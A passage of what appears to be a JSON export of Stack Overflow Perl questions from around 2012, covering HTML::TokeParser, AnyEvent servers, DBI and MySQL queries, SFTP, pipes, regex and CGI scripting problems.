&lt;string&gt;Fail&lt;/string&gt;\n    &lt;key&gt;Message&lt;/key&gt;\n    &lt;string&gt;Text&lt;/string&gt;\n    &lt;key&gt;Timestamp&lt;/key&gt;\n    &lt;date&gt;2012-10-17T08:01:51Z&lt;/date&gt;\n    &lt;key&gt;Type&lt;/key&gt;\n    &lt;integer&gt;4&lt;/integer&gt;\n&lt;/dict&gt;\n&lt;dict&gt;\n    &lt;key&gt;LogType&lt;/key&gt;\n    &lt;string&gt;Fail&lt;/string&gt;\n    &lt;key&gt;Message&lt;/key&gt;\n    &lt;string&gt;An error occurred while trying to run the script.&lt;/string&gt;\n    &lt;key&gt;Timestamp&lt;/key&gt;\n    &lt;date&gt;2012-10-17T08:20:46Z&lt;/date&gt;\n    &lt;key&gt;Type&lt;/key&gt;\n    &lt;integer&gt;7&lt;/integer&gt;\n&lt;/dict&gt;\n&lt;dict&gt;\n    &lt;key&gt;LogType&lt;/key&gt;\n    &lt;string&gt;Pass&lt;/string&gt;\n    &lt;key&gt;Message&lt;/key&gt;\n    &lt;string&gt;&lt;/string&gt;\n    &lt;key&gt;Timestamp&lt;/key&gt;\n    &lt;date&gt;2012-10-17T08:01:51Z&lt;/date&gt;\n    &lt;key&gt;Type&lt;/key&gt;\n    &lt;integer&gt;5&lt;/integer&gt;\n&lt;/dict&gt;\n&lt;/array&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>\n"},{"tags":["html","perl","parsing","crawler"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13262023,"title":"Changing directory with perl's TokeParser","body":"<p>How can I change the directory TokeParser looks when opening a file for parsing (e.g. adding a directory before $htmlFileName)?</p>\n\n<pre><code>my $p = HTML::TokeParser-&gt;new($htmlFileName);\n</code></pre>\n"},{"tags":["perl","uppercase"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":13261522,"title":"Uppercase accented characters in perl","body":"<p>Is there a way to uppercase accented characters in perl, </p>\n\n<pre><code>my $string = \"Ã©lÃ©phant\";\n\nprint uc($string);\n</code></pre>\n\n<p>So that it actually prints ÃLÃPHANT ?</p>\n\n<p>My perl script is encoded in ISO-8859-1 and $string is printed in an xml file with the same encoding.</p>\n"},{"tags":["perl","webserver","anyevent"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":13260802,"title":"Creating A Single Threaded Server with AnyEvent (Perl)","body":"<p>I'm working on creating a local service to listen on localhost and provide a basic call and response type interface.  What I'd like to start with is a baby server that you can connect to over telnet and echoes what it receives. </p>\n\n<p>I've heard AnyEvent is great for this, but the documentation for AnyEvent::Socket does not give a very good example how to do this.   I'd like to build this with AnyEvent, AnyEvent::Socket and AnyEvent::Handle.    </p>\n\n<p>Right now the little server code looks like this:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse AnyEvent;\nuse AnyEvent::Handle;\nuse AnyEvent::Socket;\n\nmy $cv = AnyEvent-&gt;condvar;\n\nmy $host = '127.0.0.1';\nmy $port = 44244;\n\ntcp_server($host, $port, sub {\n    my($fh) = @_;\n\n    my $cv = AnyEvent-&gt;condvar;\n\n    my $handle;\n    $handle = AnyEvent::Handle-&gt;new(\n        fh =&gt; $fh,\n        poll =&gt; \"r\",\n        on_read =&gt; sub {\n             my($self) = @_;\n             print \"Received: \" . $self-&gt;rbuf . \"\\n\";\n             $cv-&gt;send;\n        }\n    );\n\n    $cv-&gt;recv;\n});\n\nprint \"Listening on $host\\n\";\n\n$cv-&gt;wait;\n</code></pre>\n\n<p>This doesn't work and also if I telnet to localhost:44244 I get this:</p>\n\n<pre><code>EV: error in callback (ignoring): AnyEvent::CondVar: \nrecursive blocking wait attempted at server.pl line 29.\n</code></pre>\n\n<p>I think if I understand how to make a small single threaded server that I can connect to over telnet and prints out whatever its given and then waits for more input, I could take it a lot further from there.  Any ideas?</p>\n"},{"tags":["html","perl","parsing","crawler"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":13261330,"title":"Can't call method \"get_token\" on an undefined value","body":"<p>Whenever I run TokeParser I get this undefined error. I think it's because the last thing it pulls from the HTML is 'undef' which is causing the error but I'm sure if that's correct or what to do if it is from that.</p>\n\n<pre><code>#!usr/bin/perl\nuse warnings;\nuse strict;\n\nuse HTML::TokeParser;\n\nsub findTokens {\n    my $htmlFileName = \"83.html\";\n\n    my $p = HTML::TokeParser-&gt;new($htmlFileName);\n    my @tokens;\n\n    while (my $newChunk = $p-&gt;get_token) {\n            if ($newChunk-&gt;[0] eq 'T') {\n                my @lineArray = split(' ', $newChunk-&gt;[1]);\n                foreach my $i (@lineArray) {\n                    if ( lc($i) =~ /^[a-z]*\\-?'?s?$/) {\n                        push(@tokens, lc($i));\n                    }\n                }\n            }\n    }\n    return @tokens;\n}\n</code></pre>\n"},{"tags":["perl","module","eval"],"answer_count":6,"favorite_count":5,"up_vote_count":6,"down_vote_count":0,"view_count":4907,"score":6,"question_id":1917261,"title":"How can I dynamically include Perl modules without using eval?","body":"<p>I need to dynamically include a Perl module, but if possible would like to stay away from eval due to work coding standards. This works:</p>\n\n<pre><code>$module = \"My::module\";\neval(\"use $module;\");\n</code></pre>\n\n<p>But I need a way to do it without <code>eval</code> if possible. All google searches lead to the <code>eval</code> method, but none in any other way.</p>\n\n<p>Is it possible to do it without <code>eval</code>?</p>\n"},{"tags":["mysql","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13260881,"title":"printing contents when connected to database using perl","body":"<p>Below, is the code to connect mysql database and retrieving results using perl.</p>\n\n<p>In the below example, samples table has 10 columns. I just want the second and third columns of record 99 into variables.</p>\n\n<p>Can some one help me in this?</p>\n\n<pre><code>use strict;\n use warnings;\n use DBI;\n\nmy $dbh = DBI-&gt;connect('dbi:mysql:perltest','root','password') or die \"Connection Error: $DBI::errstr\\n\";\nmy $sql = \"select * from samples where record='99'\";\nmy $sth = $dbh-&gt;prepare($sql);\n$sth-&gt;execute or die \"SQL Error: $DBI::errstr\\n\";\nwhile (my @row = $sth-&gt;fetchrow_array) {\n print \"@row\\n\";\n } \n</code></pre>\n\n<p>Thanks in advance</p>\n"},{"tags":["mysql","sql","perl","relationship"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13259737,"title":"Perl/MySQL Relationship Query","body":"<p>I have the following perl code that will eventually be a webpage:</p>\n\n<pre><code>my($dbh) = DBI-&gt;connect(\"DBI:mysql:host=dbsrv;database=database\",\"my_sqlu\",\"my_sqlp\") or die \"Canny Connect\";\nmy($sql) = \"SELECT * FROM hardware where srv_name = \\\"$srv_name\\\"\";\nmy($sth) = $dbh-&gt;prepare($sql);\n$sth-&gt;execute();\n\n$sth-&gt;bind_col( 1, \\my($db_id));\n$sth-&gt;bind_col( 2, \\my($db_srv_name));\n$sth-&gt;bind_col( 5, \\my($db_site));\n$sth-&gt;fetchrow();\n$sth-&gt;finish ();\nmy($sql) = \"SELECT sites.\\`site_code\\`, sites.\\`long_name\\` FROM \\`hardware\\` JOIN \\`sites\\` ON \\`sites\\`.id=\\`hardware\\`.\\`site\\` where \\`hardware\\`.\\`id\\`=\\'$db_id\\'\";\nmy($sth) = $dbh-&gt;prepare($sql);\n$sth-&gt;execute();\n$sth-&gt;bind_col( 1, \\my($db_site_code));\n$sth-&gt;bind_col( 2, \\my($db_long_name));\n$sth-&gt;fetchrow();\n$sth-&gt;finish ();\n$dbh-&gt;disconnect;\nprint \"$db_site_code&lt;br&gt;$db_long_name\";\n</code></pre>\n\n<p>The query above does work however what I'm trying to find out is there any way I can run one SQL query and get the db_site_code and db_long_name from the sites DB without running the 2nd query? The hardware DB has the foreign key 'id' in the sites Db.</p>\n\n<p>When you read anything about relational DBs they all say it's by far the most efficient method of getting data from your database but I just can't see how this is any quicker than just running 2 select queries. What I've done above would surely take longer than <code>\"select from hardware where srv_name = $srv_name\"</code> then <code>\"select from sites where id = db_site_id\"</code>? Any comments are greatly appreciated.</p>\n"},{"tags":["perl","sftp"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":13257264,"title":"PERL SFTP using System, Cannot install SFTP module","body":"<p>I'm a bit new to perl and stackoverflow. If I could use a more familiar language I would, unfortunately I cannot due to certain circumstances. Thanks in advance for the help. </p>\n\n<p>Modules Not Installed: Net::SFTP, WWW::CURL, Net::SSH2, Net::SFTP::Foriegn\nModules Installed: Net::FTP</p>\n\n<p>I am unable to install modules. </p>\n\n<p>Unable to use Net::FTP Tried Default port and port 22, with a username and password. All I get back from the other box's log when trying to connect is \"Did not receive identification string from xx.xx.xx.xx\" Also unable to use FTP in command line, times out. </p>\n\n<p><code>\n$ftp = Net::FTP->new($box,Port=>22, Debug => 0)<br />\n   or die print \"Error: Cannot connect\";<br />\n$ftp->login($userBox,$passBox)<br />\n   or die print \"Error: Cannot login\";<br />\n$ftp->cwd()<br />\n   or die print \"Error: Cannot change to Root\";<br />\n$ftp->cwd($dir)<br />\n   or die print \"Error: Cannot change to selected directory\";<br />\nif($copyfile ne \"\" &amp;&amp; $dir ne \"\")<br />\n   {<br />\n      $ftp->put($copyfile, $copyfile);<br />\n   }<br />\n$ftp->quit();</code></p>\n\n<p>I can manually use SFTP through the linux command line, not FTP, so I have been trying to use the system command to SFTP into the other box. The other box's logs just say \"Connection closed by xx.xx.xx.xx\"</p>\n\n<p><code>\nsystem('sftp '.$userBox.'@'.$box.' ENDOFINPUT'<br />\n.$passBox.'ENDOFINPUT<br />\ncd ../../../<br />\nput '.$filename.' '.$dir.'<br />\nexit<br />\nENDOFINPUT');</code></p>\n\n<p>If anyone knows how to help me with my problem that'd be great :) </p>\n"},{"tags":["perl","data","normalization"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13256338,"title":"How can I normalize my results in perl with foreach control structure?","body":"<p>I have this output:</p>\n\n<pre><code>10dvex2_miRNA_ce.out.data|6361\n10dvex2_miRNA_ce.out.data|6361\n10dvex2_misc_RNA_ce.out.data|0\n10dvex2_rRNA_ce.out.data|239\n</code></pre>\n\n<p>with this script in Perl:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\nuse strict;\n\nopen(MYINPUTFILE, $ARGV[0]); # open for input\nmy @lines = &lt;MYINPUTFILE&gt;; # read file into list\nmy $count = 0;\nprint \"Frag\".\"\\t\".\"ncRNA\".\"\\t\".\"Amount\".\"\\n\";\n\nforeach my $lines (@lines){\nmy $pattern = $lines;\n$pattern =~ s/(.*)dvex\\d_(.*)_(.*).(out.data)\\|(.*)/$1 $2   $3  $5/g;\n$count += $5;\nprint $1.\"\\t\".$2.$3.\"\\t\".$5.\"\\n\";\n}\nclose(MYINPUTFILE);\nexit;\n</code></pre>\n\n<p>I extract this information:</p>\n\n<pre><code>Frag    ncRNA   Amount\n10  miRNAce 6361\n10  misc_RNAce  0\n10  rRNAce  239\n</code></pre>\n\n<p>but in the Amount column i want to report those numbers divided by the total result (6600). In this case i want this output:</p>\n\n<pre><code>Frag    ncRNA   Amount\n10  miRNAce 0.964\n10  misc_RNAce  0\n10  rRNAce  0.036\n</code></pre>\n\n<p>My problem is extract the TOTAL result in the loop...to normalize this data. Some ideas?</p>\n"},{"tags":["c","perl","pipes"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":54,"score":5,"question_id":13259004,"title":"Concurrent Input and Output in Perl","body":"<p>Recently I've taken up learning pipes for fun. I've gotten stuck on a few parts but I have it mostly figured out I think, however I cannot figure out how to get input to forward to a program and output from that program at the same time.</p>\n\n<p>Currently I have this Perl script that handles the piping:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse threads;\nuse FileHandle;\nuse IPC::Open2;\n\nmy $cv_program = \"./test\"; #test is the compiled C program below\nmy $cv_message = \"\";\nmy $cv_currentkey = \"\";\nmy $pid = open2(*PIN, *POUT, $cv_program);\nmy $thread_pipeout = threads-&gt;create('PIPEOUT', \\&amp;PIN);\n\n$thread_pipeout-&gt;detach();\n\nwhile($cv_currentkey ne \"\\n\")\n{\n    $cv_currentkey = getc(STDIN);\n    $cv_message .= $cv_currentkey;\n}\nprint POUT $cv_message;\n\nsub PIPEOUT\n{\n    my $PIN = shift;\n    while(&lt;PIN&gt;)\n    {\n        print $_;\n    }\n}\n</code></pre>\n\n<p>And then I have this C program which just outputs something, asks for a string, then prints that string:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(int argc, char const *argv[])\n{\n    char input[100] = {0};\n\n    printf(\"This is a test.\\n\");\n    fgets(input, 100, stdin);\n    printf(\"You entered %s\\n\", input);\n    return 0;\n}\n</code></pre>\n\n<p>The output from running the Perl script is:</p>\n\n<pre><code>~/Programming/Perl Pipes$ ./pipe.pl\nHello\nThis is a test.\nYou entered Hello\n</code></pre>\n\n<p>Notice it blocks while taking input and then prints everything in a block after. I need it to print This is a test, then wait for input like the actual program would.</p>\n\n<p>Also I'll note is the reason I use getc instead of STDIN in the Perl script is because I couldn't find a way to get STDIN to not block the output from test.c, however getc isn't working too well at the moment either.</p>\n"},{"tags":["perl","api","microsoft","advertising","keyword"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":10097155,"title":"Create Keyword Object Perl Microsoft::AdCenter","body":"<p>So I looked at the perldoc for the Microsoft::AdCenter module and it shows this as an example of how to create a keyword object:</p>\n\n<p><code>~$ perldoc Microsoft::AdCenter</code></p>\n\n<pre><code>#Create a Keyword object\nmy $keyword = Microsoft::AdCenter::V7::CampaignManagementService::Keyword-&gt;new\n           -&gt;Text(\"some text\")\n           -&gt;BroadMatchBid(Microsoft::AdCenter::V7::CampaignManagementService::Bid-&gt;new-&gt;Amount(0.1))\n           -&gt;ExactMatchBid(Microsoft::AdCenter::V7::CampaignManagementService::Bid-&gt;new-&gt;Amount(0.1)); \n</code></pre>\n\n<p>However, doesn't this violate the new policy of using only one match type per keyword?</p>\n\n<p>Campaign Management changes:</p>\n\n<p>\"Previously, you would create a single Keyword object and specify a bid value for each match that you wanted to bid on (for example, exact match or phrase match). If you did not specify a bid value at the keyword-level, adCenter used the default bid value specified at the ad group level.</p>\n\n<p>Now, you must create a Keyword object for each match type that you want to bid on. For example, to bid on the keyword car by using exact match and phrase match, create a Keyword object and set the Text element to car and the ExactMatchBid element to a bid amount. Then, create a second Keyword object and set the Text element to car and PhraseMatchBid to a bid amount. When you add the keywords, youâll get a unique keyword ID for each keyword and match-type combination.\"</p>\n\n<p>It seems like the perldoc is not up to date. These perldocs were last updated on 2011-05-15. When will the perldocs be updated?</p>\n\n<p>Also when will the <a href=\"http://msdn.microsoft.com/en-US/library/bb671833(v=msads.70).aspx\" rel=\"nofollow\">Msdn API Docs</a> be updated? </p>\n\n<p><a href=\"http://msdn.microsoft.com/en-us/library/cc300296.aspx\" rel=\"nofollow\">Add Keywords in Perl</a></p>\n"},{"tags":["perl","authorization","oauth-2.0","google-adwords-api"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":12592794,"title":"Migrating Authorization Mechanics ClientLogin to OAuth2 Google AdWords v201206 Perl","body":"<p>So I previously was using <a href=\"https://developers.google.com/accounts/docs/AuthForInstalledApps\" rel=\"nofollow\">ClientLogin</a> for authorization in the Google AdWords API but after looking at <a href=\"https://developers.google.com/accounts/docs/AuthForInstalledApps\" rel=\"nofollow\">AuthForInstalledApps</a> it says that this mechanism has been deprecated in favor of <a href=\"https://developers.google.com/accounts/docs/OAuth2\" rel=\"nofollow\">OAuth2.0</a></p>\n\n<p>I have registered my application in the <a href=\"https://code.google.com/apis/console/\" rel=\"nofollow\">API Consoles</a>.  Now I am trying to follow the perl example of how to set this up:</p>\n\n<p><a href=\"http://code.google.com/p/google-api-adwords-perl/source/browse/trunk/examples/v201206/misc/use_oauth2.pl\" rel=\"nofollow\">use_oauth2.pl</a></p>\n\n<p>I cannot place the AdWords Client, credentials in  <a href=\"http://code.google.com/p/google-api-adwords-perl/source/browse/trunk/adwords.properties\" rel=\"nofollow\">~/adwords.properties</a> since I have multiple accounts that I will be doing Campaign Management operations on, and therefore multiple client ids.</p>\n\n<p>But for now I tried to follow this example by using just one of my client's info like this:</p>\n\n<pre><code>my $client = Google::Ads::AdWords::Client-&gt;new(\n    {\n        version  =&gt; 'v201206',\n        developer_token =&gt; TOKEN,\n        client_id =&gt; $google_account_id\n    }\n);\n\n$client-&gt;get_auth_token_handler()-&gt;set_email($login);\n$client-&gt;get_auth_token_handler()-&gt;set_password($password);\n</code></pre>\n\n<p>However when I step through this, when it tries to initialize the <code>Client</code> object it throws this error:</p>\n\n<pre><code>Can't use an undefined value as a HASH reference at (eval 845)[/usr/lib/perl5/vendor_perl/5.8.8/HTTP/Message.pm:371] line 1. at (eval 845)[/usr/lib/perl5/vendor_perl/5.8.8/HTTP/Message.pm:371] line 1\nHTTP::Message::__ANON__[(eval 845)[/usr/lib/perl5/vendor_perl/5.8.8/HTTP/Message.pm:371]:1]() called at /home/etienne/backend/libs/Google/Ads/Common/HTTPTransport.pm line 30\nGoogle::Ads::Common::HTTPTransport::client('Google::Ads::Common::HTTPTransport=HASH(0xb59b830)', 'Google::Ads::AdWords::Client=SCALAR(0x9b9bb60)') called at /home/etienne/backend/libs Google/Ads/AdWords/Client.pm line 180\nGoogle::Ads::AdWords::Client::START('Google::Ads::AdWords::Client=SCALAR(0x9b9bb60)', 1, 'HASH(0xb582e70)') called at /usr/lib/perl5/site_perl/5.8.8/Class/Std/Fast.pm line 251\nClass::Std::Fast::__ANON__[/usr/lib/perl5/site_perl/5.8.8/Class/Std/Fast.pm:252]() called at /usr/lib/perl5/site_perl/5.8.8/Class/Std/Fast.pm line 287\nClass::Std::Fast::new('Google::Ads::AdWords::Client', 'HASH(0xb54c210)') called at /home/etienne/backend/search_marketing/data_exchange/lib/GoogleAPIv2.pm line 3555\nGoogleAPIv2::get_adwords_client('GoogleAPIv2=HASH(0xb556d10)', 4202697829) called at /home/etienne/backend/search_marketing/data_exchange/lib/GoogleAPIv2.pm line 230\nGoogleAPIv2::add_campaign('GoogleAPIv2=HASH(0xb556d10)', 'name', 'API Upgrade Test Campaign - 1348613850', 'google_account_id', 4202697829, 'account_id', 207, 'country_code', 'US', ...) called at google_add_campaign.t line 110\nmain::main() called at google_add_campaign.t line 26\nscalar context return from CODE(0x9b909c0): *Class::Std::Fast::_cache\n1..3\n</code></pre>\n\n<p>I am using <code>Perl v5.8.8</code> .  I have installed the latest <code>Adwords Perl Client Library v2.7.2</code> .  Is there some kind of dependency issue?\nAnd how can I go about resolving this issue.  Any information you can provide would be very helpful.  Thanks.</p>\n"},{"tags":["regex","arrays","perl","stdin"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":70,"score":-1,"question_id":13240389,"title":"Perl - Gather all of STDIN until blank line or EOF","body":"<p>How can I gather all lines from STDIN lines until a blank line or EOF, whichever comes first. It would look something like:</p>\n\n<pre><code> my @lines;\n\n while(&lt;&gt; ne EOF || &lt;&gt; not blank) {\n      chomp;\n      push(@lines, $_);\n }\n</code></pre>\n"},{"tags":["php","forms","perl","http"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":56,"score":-6,"question_id":13258182,"title":"How to transle code from PERL to PHP","body":"<p>I have follow perl code:</p>\n\n<pre><code>my $form = POST 'http://example.com/api',\n    Content_Type =&gt; 'form-data',\n    Content =&gt; [\n        # param =&gt; [ file, filename, Other ]\n        \"UFileManager[picture]\" =&gt; \"\",\n        \"UFileManager[picture]\" =&gt; [ $filename,\n                                   $filename,\n                                   Content_Type =&gt; 'image/png' ],\n        yt0 =&gt; \"Upload\",\n        ];\n</code></pre>\n\n<p>So how can I port it to PHP. Or how <code>Content</code> looks like in html request body?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13251635,"title":"How can I run a program (with a timeout) and know how it ended (signal, exit code, etc) in Perl on a modern Linux?","body":"<p>I need to run a program, feed some strings on its stdin, read its stdout/stderr and know how it ended. I have to know if it received a signal (segfault, etc) and its exit code. Also, if the program runs for more than some amount of time, I have to know it (and kill it).</p>\n\n<p>How would you do that? Is there a module that handles this kind of things?</p>\n"},{"tags":["perl","hash"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":72,"score":2,"question_id":13257095,"title":"remove duplicate values for a key in hash","body":"<p>I have the following code</p>\n\n<pre><code>chdir(\"c:/perl/normalized\");\n$docid=0;\nmy %hash = ();\n@files = &lt;*&gt;;\nforeach $file (@files) \n  {\n    $docid++;\n    open (input, $file);    \n    while (&lt;input&gt;) \n      {\n    open (output,'&gt;&gt;c:/perl/tokens/total');\n    chomp;\n    (@words) = split(\" \");  \n    foreach $word (@words)\n    {\n    push @{ $hash{$word} }, $docid;\n\n    }\n      }\n   }\nforeach $key (sort keys %hash) {\n    print output\"$key : @{ $hash{$key} }\\n\";\n}\n\n\nclose (input);\nclose (output);\n</code></pre>\n\n<p>This is a sample output in a file</p>\n\n<pre><code>of : 1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 3 3 4 4 4 4 5 6 6 7 7 7 7 7 7 7 7 7\n</code></pre>\n\n<p>it is true since the term \"of\" for example existed 10(ten ones) times in the first document\nhowever is there a way to remove the repeated values; i.e instead of ten ones I want just one\nThank you for your help</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":698,"score":2,"question_id":7559473,"title":"In perl, backreference in replacement text followed by numerical literal","body":"<p>I'm having trouble with a backreference in my replacement text that is followed by a literal. I have tried the following:</p>\n\n<pre><code>perl -0pi -e \"s/(&lt;tag1&gt;foo&lt;\\/tag1&gt;\\n\\s*&lt;tag2&gt;)[^\\n]*(&lt;\\/tag2&gt;)/\\1${varWithLeadingNumber}\\2/\" file.xml\nperl -0pi -e \"s/(&lt;tag1&gt;foo&lt;\\/tag1&gt;\\n\\s*&lt;tag2&gt;)[^\\n]*(&lt;\\/tag2&gt;)/\\g{1}${varWithLeadingNumber}\\g{2}/\" file.xml\n</code></pre>\n\n<p>The first of course causes problems because ${varWithLeadingNumber} begins with a number, but I thought the <code>\\g{1}</code> construct in my second attempt above was supposed to solve this problem. I'm using perl 5.12.4.</p>\n"},{"tags":["regex","perl","parsing","logging","filehandler"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13243008,"title":"Perl - Parse blocks from text file","body":"<p>First, I apologize if you feel this is a duplicate.  I looked around and found some very similar questions, but I either got lost or it wasn't quite what I think I need and therefore couldn't come up with a proper implementation.</p>\n\n<p>QUESTION:</p>\n\n<p>So I have a txt file that contains entries made by another script (I can edit the format for how these entries are generated if you can suggest a better way to format them):</p>\n\n<pre><code>SR4 Pool2\n11/5/2012 13:45\n----------\nBeginning Wifi_Main().\n\nSR4 Pool2\n11/8/2012 8:45\n----------\nThis message is a\nmultiline message.\n\nSR4 Pool4\n11/5/2012 14:45\n----------\nBeginning Wifi_Main().\n\nSR5 Pool2\n11/5/2012 13:48\n----------\nBeginning Wifi_Main().\n</code></pre>\n\n<p>And I made a perl script to parse the file:</p>\n\n<pre><code>#!C:\\xampp-portable\\perl\\bin\\perl.exe\n\nuse strict;\nuse warnings;\n#use Dumper;\n\nuse CGI 'param','header';\nuse Template;\n#use Config::Simple;\n\n#Config::Simple-&gt;import_from('config.ini', \\%cfg);\n\nmy $cgh = CGI-&gt;new;\nmy $logs = {};\nmy $key;\n\nprint \"Content-type: text/html\\n\\n\"; \n\nopen LOG, \"logs/Pool2.txt\" or die $!;\n\n\nwhile ( my $line = &lt;LOG&gt; ) {\n    chomp($line);\n\n}\n\nprint $logs;\n\nclose LOG;\n</code></pre>\n\n<p>My goal is to have a hash in the end that looks like this:</p>\n\n<pre><code>$logs = {\n    SR4 =&gt; {\n           Pool2 =&gt; {\n                {\n                    time =&gt; '11/5/2012 13:45',\n                    msg  =&gt; 'Beginning Wifi_NDIS_Main().',\n                },\n                {\n                    time =&gt; '11/8/2012 8:45',\n                    msg  =&gt; 'This message is a multiline message.',\n                },\n           },\n           Pool4 =&gt; {\n                {\n                    time =&gt; '11/5/2012 13:45',\n                    msg  =&gt; 'Beginning Wifi_NDIS_Main().',\n                },\n           },\n    },\n    SR5 =&gt; {\n           Pool2 =&gt; {\n                {\n                    time =&gt; '11/5/2012 13:45',\n                    msg  =&gt; 'Beginning Wifi_NDIS_Main().',\n                },\n           },\n    },\n</code></pre>\n\n<p>};</p>\n\n<p>What would be the best way of going about this?  Should I change the formatting of the generated logs to make it easier on myself?  If you need anymore info, just ask.  Thank you in advanced. :)</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":13248547,"title":"How to read all files line by line from a directory using perl?","body":"<p>For example I have a folder called verilog inside that folder I have some more folders and </p>\n\n<p>files. I have to search for a pattern in each files line by line in the directory and print </p>\n\n<p>the filename and linenumber and the count for the pattern which I have searched. Please </p>\n"},{"tags":["linux","perl","ulimit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13255749,"title":"How to set ulimit to unlimited in perl?","body":"<p>I want all child processes of my perl script to generate core files in case of unexpected failures. So how can I set <code>ulimit</code> to <code>unlimited</code> inside perl?</p>\n"},{"tags":["forms","perl","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":13236147,"title":"CGI script not displaying results in browser","body":"<p>I am attempting to display some info from an infoblox device. When I run this code in a browser using an html post, the table that displays MAC address entries does not display the values from the api. When I run this code in the unix command-line, the variables show up appropriately. Any Advice? </p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse Infoblox;\nuse CGI;\nmy $cgi = new CGI;\n\nprint\n\n$cgi-&gt;header() .\n\n$cgi-&gt;start_html( -title =&gt; 'Form Results') .\n\n$cgi-&gt;h1('Form Results') . \"\\n\";\n\nmy @params = $cgi-&gt;param();\nmy $username = $cgi-&gt;param('username');\nprint '&lt;table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"&gt;' . \"\\n\";\nforeach my $parameter (sort @params) {\nprint \"&lt;tr&gt;&lt;th&gt;$parameter&lt;/th&gt;&lt;td&gt;\" . $cgi-&gt;param($parameter) . \"&lt;/td&gt;&lt;/tr&gt;\\n\";\n}\nprint \"&lt;/table&gt;\\n\";\nprint \"&lt;p&gt;$username&lt;/p&gt;\";\n\nprint $cgi-&gt;end_html . \"\\n\";\n\n\n\n#Create a session to the Infoblox appliance\nmy $session = Infoblox::Session-&gt;new(\n    master   =&gt; \"server\",          #appliance host ip\n    username =&gt; \"username\",          #appliance user login\n    password =&gt; \"password\"           #appliance password\n);\n\nunless ($session) {\n    die(\"Construct session failed: \",\n    Infoblox::status_code() . \":\" . Infoblox::status_detail());\n}\n\nprint \"Session created successfully\\n&lt;br&gt;\";\n\nmy @list = $session-&gt;get(\n    object =&gt; \"Infoblox::DHCP::MAC\",\n    filter =&gt; \"macfilter\",\n);\n\nmy $nextobject = $list[0];\n\nprint &lt;&lt;EOF;\n&lt;br&gt;\n&lt;table&gt;\n&lt;tr&gt;\n&lt;th&gt;MAC&lt;/th&gt;\n&lt;th&gt;Description&lt;/th&gt;\n&lt;th&gt;UserID&lt;/th&gt;\n&lt;th&gt;Expiration&lt;/th&gt;\n&lt;/tr&gt;\nEOF\n\nforeach my $test ( @list ) {\n\n   print \"&lt;tr&gt;\";\n   print \"&lt;td&gt; $test-&gt;mac()&lt;/td&gt;\";\n   print \"&lt;td&gt;\" . scalar($test-&gt;comment()) . \"&lt;/td&gt;\\n\";\n   print \"&lt;td&gt;\" . scalar($test-&gt;username()) . \"&lt;/td&gt;\\n\";\n   print \"&lt;td&gt;\" . scalar(localtime(scalar($test-&gt;expiration_time()))) . \"&lt;/td&gt;\\n\";\n   print \"&lt;/tr&gt;\";\n\n}\n\nexit (0);\n</code></pre>\n"},{"tags":["regex","perl","file-io"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":13252000,"title":"Regular Expression pattern storing in array","body":"<p>I am new to perl and want to read a file in which IP are stored , i want to grep these IP and store in array , i am able to write the regex for this but out of three ips it always stores last ip of file in array , please help someone my code and file is like below.</p>\n\n<p>my input file have follwing contents</p>\n\n<blockquote>\n  <p>Hi praveen how are10.23.54.86</p>\n  \n  <p>10.87.98.65</p>\n  \n  <p>10.98.76.54</p>\n</blockquote>\n\n<p>my script o/p is </p>\n\n<blockquote>\n  <p>/pearl$ ./par.pl sdp.txt </p>\n  \n  <p>10.98.76.54</p>\n</blockquote>\n\n<p>and code is </p>\n\n<pre><code>#!/usr/bin/perl\n\nopen (INPUT,$ARGV[0]) || die \"Can not open file:$!\";\n\n$i=0;\n\nwhile(&lt;INPUT&gt;)\n{\n  $line=$_;\n  ($arr,$arr1,$arr2)=($line=~m/\\d+[\\.]\\d+[\\.]\\d+[\\.]\\d+/g);\n}\n\n\nclose(INPUT);\n\nprint $arr,\"\\n\";\n</code></pre>\n\n<p>I tried with array and as well as variable but same results its only stores last 